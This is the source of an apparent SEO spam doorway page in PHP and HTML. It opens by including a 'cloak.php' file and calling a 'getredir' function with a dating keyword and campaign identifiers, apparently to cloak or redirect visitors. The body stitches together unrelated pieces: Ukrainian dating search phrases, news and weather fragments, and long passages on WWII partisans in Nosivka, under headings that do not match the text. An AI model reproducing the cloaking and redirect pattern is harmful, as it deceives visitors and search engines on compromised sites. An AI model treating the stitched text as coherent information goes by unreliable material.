<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%be%d0%b4%d1%80%d1%83%d0%b6%d0%b5%d0%bd%d1%96+%d0%9f%d0%b5%d1%82%d1%80%d0%be%d0%b2%d0%be-%d0%9a%d1%80%d0%b0%d1%81%d0%bd%d0%be%d1%81%d1%96%d0%bb%d0%bb%d1%8f+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Lyakh R D Temirova N R Istoriya Ukrayini Z Nay</title>
	<meta name="description" content="Петро́во-Красносілля (у — роках — Петровське) — місто районного значення в Луганській області України, Підпорядковане міській раді міста." />
	<link rel="canonical" href="https://masage.od.ua/img/208/lis-znayomstva-odruzhen.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/208/juta-mlyoneri-znayomstva.php">мільйонери знайомства в Ялта Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/361/he-nch-shvidksnih-pobachen.php">ніч швидкісних побачень Коломия Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/237/xove-dodatok-dlya-pdklyuchennya.php">додаток для підключення Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Знайомства одружені Петрово-Красносілля Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Тривалість дня — 9 год 55 хв. Сьогодні день на 3 хвилини довший, ніж вчора. Повний місяць — 27 лютого, через 18 днів.</p>
		
			
				<div>9 класс, 8 мая - Урок онлайн 9 класс Украинская литература: «Черная рада» П. Кулиша</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/tFz0Wdj-kpw' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Погода на карті. Новини України та світу. Українка втратила сім'ю, поки гарувала на заробітках в Італії.</p><a id='v1'></a><h3>. . . все ваши любимые книги онлайн</h3><p>Як Маша Кончаловска, яка 7 років у комі, жила до аварії: фото. Сміттєвоз перетворив маршрутку з українцями на купу металу. Жінку Медведчука внесли до бази сайту «Миротворець». Особливо жорстоко розправляються окупанти із радянським активом, партизанами і людьми, які підтримували зв'язок з партизанами.</p>
		
			<br><ul>
			
				<li>Бунятян.pdf;</li>
			
				<li>знайомства на південь в Кропивницький Україна.</li>
			
				<li>підключити безкоштовно Марганець Україна.</li>
			
				<li>Бунятян.pdf?</li>
			
				<li>просто знайомства в Шепетівка Україна.</li>
			
				<li>знайомства з людиною з Росії Гребінка Україна?</li>
			
				<li>найкращий сайт підключення Синельникове Україна.</li>
			
			</ul>
		
	<p>В перші дні окупації загинули в нерівному бою з поліцією жителі міста Григорій Падун та Іван Соловей , які виконували завдання командування партизанського загону. Упізнавши вбитих, окупанти арештовують дружину і четверо дітей Падуна. Після нелюдських тортур їх живими закопали в могилу разом з убитими батьками. Фашисти розтріляли батьків Івана Солов'я, дружину Худолія , дружину і двох дітей Кривші. Дитину, якій виповнилося лише два тижні, гестапівець підняв за вушко і вистрілив у голову. Організаторами підпілля робилося все, щоб забезпечити успішну боротьбу з німецько-фашистськими загарбниками.</p>
		
			<br><ol>
			
				<li>мій сайт знайомств поблизу Керч Україна;</li>
			
				<li>Відкритий реєстр юридичних осіб, без капчі та реєстрації.</li>
			
				<li>IСТОРИЧНИЙ КАЛЕНДАР КIРОВОГРАДЩИНИ НА 2013 РIК!</li>
			
				<li>знайомства для одиноких людей в Красилів Україна.</li>
			
				<li>знайомства з кимось із Гірник Україна.</li>
			
				<li>зона знайомств Словянськ Україна?</li>
			
				<li>старші швидкісні знайомства в Кальміуське Україна.</li>
			
			</ul>
		
	<p>Але дійсність показала, що передбачити все в тих умовах було трудно. Вже перша група, якою повинен був командувати Омелян Хахуда, залишилася без командира. Хахуда в ліс не з'явився, а вирішив сховатися від ворога вдома. Чимало членів бойових груп, коли наблизився фронт, відступили разом з військовими частинами. Знайшлися і такі, які ціною зради надіялися заслужити помилування окупантів. Ці зрадники видали ворогу розташування лісових складів продовольства і зброї. Всі ці несподіванки не були передбачені і багато зашкодили розгортанню партизанської боротьби.</p>
<p>Ядром Носівського партизанського загону була група М. Скоро до них приєдналася група голови Червонопартизанської сільської ради Кузьми Огієнка. В цей час партизани зустріли червоноармійців-кавалеристів, які потрапили в оточення німецьких військ і вирішили продовжувати боротьбу з ворогом у партизанському загоні. Серед них були Шевирьов , Байбуров , Григор'єв.</p>
		
	<p>Коли на початку жовтня в ліс прибули члени підпільного райкому партії, група Симоненка вже нараховувала 32 бійці. Стратилат зібрав решту розпорошених по лісах груп і об'єднав усіх бійців у партизанський загін, який тепер уже мав 68 чоловік. В урочищі Орішне , де був створений Носівський партизанський загін, споруджено великий обеліск партизанської Слави.</p>
<p>Третього жовтня в розташування Носівського партизанського загону прибули посланці підпільного обкому партії. Це були М. Демченко — заввідділом обкому партії та зв'язковий обласного партизанського загону П. Вони зібрали всіх бійців партизанського загону, розповіли про становище на фронтах та проінформували про наказ підпільного обкому партії активізувати боротьбу з окупантами.</p>
<p>Виходячи із наявності на території району комунікацій, по яких забезпечувалося обслуговування німцями фронту, підпільний обком ставить завдання розпочати диверсії на цих шляхах. Адже до цього часу, зважаючи на малочисельність загону, партизани уникали відкритих сутичок з окупантами.</p>
<p>На початковому етапі боротьби основною була роз'яснювальна робота серед населення та налагодження зв'язків. Тепер було поставлено пряме завдання перейти до активної боротьби з окупантами та їх прислужниками — поліцаями. Разом з Демченком в загін прибула група партизан із Підгайного. Нею командував замість Хахуди — Бондар. Таким чином загін збільшився ще на 17 бійців. Але загальна атмосфера в загоні була досить важка. Невизначеність обстановки на фронтах пригнічували багатьох, навіть членів підпільного райкому. Наприклад, Окостень і Кононенко пропонували не розгортати бойових дій, а зберігати сили до того часу, поки регулярна армія не почне гнати ворога з нашої території, і лише тоді включити ся в боротьбу.</p>
<p>Довгопол і Серновець пропонували іти до лінії фронту і там влитися в частини Радянської Армії. Потрібні були велика сила волі Стратилата, вміння працювати з людьми, щоб переконати своїх бійців у важливості боротьби з окупантами тут, у тилу ворога. Починалася важка і боротьба з ворогом. Попереду було дуже багато боїв, з перемогами і непоправимими втратами. Але перший бій, перше бойове хрещення ніколи не забувалися. Про нього часто згадували народні месники. Маючи відомості про те, що в с. Козари раніше ніж в інших селах було організовано із німецьких запроданців поліцію, командування загону вирішує знищити її.</p>
<p>Щоб це було уроком і для інших сіл. Цей бій відбувся в ніч з 4 на 5 листопада. Поліцейський стан знаходиться з приміщенні колишньої сільради. Охоронявся він цілодобово. Бойову операцію доручили очолити групі Бондаря. Участь у ній брав і Симоненко. Як згадує останній, для бойової операції було відібрано 17 партизанів, яких привіз сюди підводою О.</p>
<p>Накрапав невеликий дощ. О 4-й годині ночі партизани оточили поліцейський стан. Бійці загону Шевчук, Потій, Вовкогон, Супрун та інші беруть під приціл вікна, і двері будинку. Бондар і М. Симоненко підповзають до ганку, на якому стоять два вартових поліцаї. Симоненко грізно наказує: «Руки вгору». Один із вартових зразу ж вистрілив.</p><strong><a id='v2'></a><h2>Погода у Петрово-Красносіллі (Петровському) зараз</h2></strong><p>Тоді партизани відкрили шквальний вогонь. Із будинку стали відстрілюватись застрочив кулемет. Починається бій. Бібіков кидає у вікно будинку одну гранату, за нею другу. Будинок затрясло, посипалися шибки. Ворог більше не відстрілювався. Поліцейський стан знищено. Трофеї партизан: ручний кулемет, 4 гвинтівки, набої, гранати. Це було перше бойове хрещення. Перший успіх підняв бойовий настрій народних месників.</p><strong><a id='v3'></a><h2>Чернігівські відомості (газета нашого міста) №48 by Роман Трохименко - Issuu</h2></strong><p>Підбадьорились патріоти, принишкли зрадники. У першій половині жовтня загін в основному було сформовано. Його бійці вже почали обживати лісові домівки, раз-у-раз даючи знати про себе ворогам. Але частина тих, хто дав згоду стати народними месниками залишилися біля своїх сімей. Яка причина їх неявки в загін, чому вони не включились в боротьбу з ворогом? Все це потрібно було знати командуванню. І ось було вирішено підготувати листа до всіх, хто не з'явився в партизанській загін і під розписку вручити його. Цим також перевірялася дієвість підпільників, явочні квартири, наявність зв'язкових.</p>
<p>Завдання зустрітися з такими комуністами було доручено Симоненку, Шевирьову та іншим. До цього завдання був залучений і Іван Панасович Шелест. Цей захід можна вважати не тільки організаційним. По суті відвідування квартир комуністів було зв'язане не з меншим ризиком ніж участь в бойових операціях. Адже в Носівці і селах були розташовані гітлерівські військові частини, вже була створена поліція. Микола Симоненко розповідав, як, виконуючи це доручення він мало не потрапив у руки окупантів.</p>
<p>Пробравшись у зайняту гітлерівцями Носівку, він прийшов на явочну квартиру Ганни Труніної. Із зброї він мав при собі револьвер і декілька гранат. Але коли зайшов на подвір'я, побачив, що в хаті багато німців. Тікати вже було пізно, бо на нього окупанти звернули увагу. При обшуку у його б знайшли зброю і кінець операції був би для нього трагічним.</p>
<p>Найменшим хвилюванням можна, видати себе. Тоді партизан вирішив іти в хату. Коли німець запитав: «Хто ти?</p><strong><a id='v4'></a><h2>Коли кулі співали. Біографії отаманів Холодного Яру і Чорного лісу (fb2)</h2></strong><p>А Труніна підтвердила: «Це мій чоловік». Як хотілося безстрашному партизанові розправиться з фашистами, але довелось пересилити себе, щоб виконати завдання командира партизанського загону і не «завалити» явочної квартири. Витримка і сила волі допомогли партизанові вийти із скрутного становища. Тоді ж завдання — вручити листи Стратилата і доставити в загін тих, хто згодиться стати партизанами, одержав Іван Панасович Шелест. Але для нього виконання такого завдання закінчилося трагічно. Загибель Шелеста була першою втратою загону. Іван Панасович Шелест працював директором Носівського молокозаводу.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/377/sogeh-znayomstva-tolstushki-v.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/467/sar-bezkoshtovn-sayti.php">безкоштовні сайти підключення поблизу Теребовля Україна</a></li><li><a href="https://masage.od.ua/img/428/sare-shvidksn-pobachennya.php">швидкісні побачення пятниця в Голубівка Україна</a></li><li><a href="https://masage.od.ua/img/467/qeb-veb-sayti-mskih.php">веб-сайти міських знайомств Кременець Україна</a></li><li><a href="https://masage.od.ua/img/137/pyv-znayomstva-z-kimos.php">знайомства з кимось у Дніпрорудне Україна</a></li><li><a href="https://masage.od.ua/img/361/filed-msto-pdklyuchiti.php">місто підключити в Кременчук Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#v1'>. . . все ваши любимые книги онлайн</a></li>
<li><a href='#v2'>Погода у Петрово-Красносіллі (Петровському) зараз</a></li>
<li><a href='#v3'>Чернігівські відомості (газета нашого міста) №48 by Роман Трохименко - Issuu</a></li>
<li><a href='#v4'>Коли кулі співали. Біографії отаманів Холодного Яру і Чорного лісу (fb2)</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/240/tasaz-shvidksn-znayomstva-oglyadi.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>